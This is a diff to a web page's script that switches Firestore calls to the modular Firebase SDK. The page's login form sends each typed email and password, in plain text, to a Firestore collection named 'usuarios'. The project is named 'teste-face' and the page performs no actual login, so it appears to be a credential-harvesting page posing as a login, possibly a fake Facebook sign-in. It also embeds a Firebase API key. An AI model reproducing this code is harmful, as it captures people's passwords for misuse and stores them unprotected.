@@ -188,29 +188,12 @@
 
     <!-- Firebase Configuration and Firestore Integration -->
     <script type="module">
-        import { collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
-
-    // Inicializar Firestore
-const db = getFirestore(app);
-
-// Teste de conexão
-db.collection("usuarios").add({
-    email: "teste@example.com",
-    password: "senha123"
-})
-.then(() => {
-    console.log("Teste: Documento adicionado com sucesso!");
-})
-.catch((error) => {
-    console.error("Teste: Erro ao adicionar documento: ", error);
-});
-
-        // Import the functions you need from the SDKs you need
+        // Importar funções do Firebase
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-analytics.js";
-        import { getFirestore } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
 
-        // Your web app's Firebase configuration
+        // Sua configuração do Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyDN99R5e_5gyrVG8SLSAVRcQBnKQZl1JSk",
             authDomain: "teste-face-f0bc1.firebaseapp.com",
@@ -221,31 +204,48 @@ db.collection("usuarios").add({
             measurementId: "G-7DJ3ZJR9P5"
         };
 
-        // Initialize Firebase
+        // Inicializar Firebase
         const app = initializeApp(firebaseConfig);
         const analytics = getAnalytics(app);
 
         // Inicializar Firestore
         const db = getFirestore(app);
 
+        // Função para testar a conexão com Firestore
+        async function testarConexao() {
+            try {
+                const usuariosCollection = collection(db, "usuarios");
+                await addDoc(usuariosCollection, {
+                    email: "teste@example.com",
+                    password: "senha123"
+                });
+                console.log("Teste: Documento adicionado com sucesso!");
+            } catch (error) {
+                console.error("Teste: Erro ao adicionar documento: ", error);
+            }
+        }
+
+        // Executar o teste de conexão quando a página carregar
+        window.addEventListener('load', testarConexao);
+
         // Adicionar listener para o evento de submit do formulário
-        document.getElementById('login-form').addEventListener('submit', function(event) {
+        document.getElementById('login-form').addEventListener('submit', async function(event) {
             event.preventDefault(); // Evita o envio padrão do formulário
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Adiciona os dados ao Firestore na coleção 'usuarios'
-            db.collection("usuarios").add({
-                email: email,
-                password: password
-            })
-            .then(() => {
+            try {
+                const usuariosCollection = collection(db, "usuarios");
+                await addDoc(usuariosCollection, {
+                    email: email,
+                    password: password
+                });
                 alert("Dados enviados com sucesso!");
-            })
-            .catch((error) => {
+                console.log("Dados enviados com sucesso!");
+            } catch (error) {
                 console.error("Erro ao enviar os dados: ", error);
-            });
+            }
         });
     </script>
 </body>
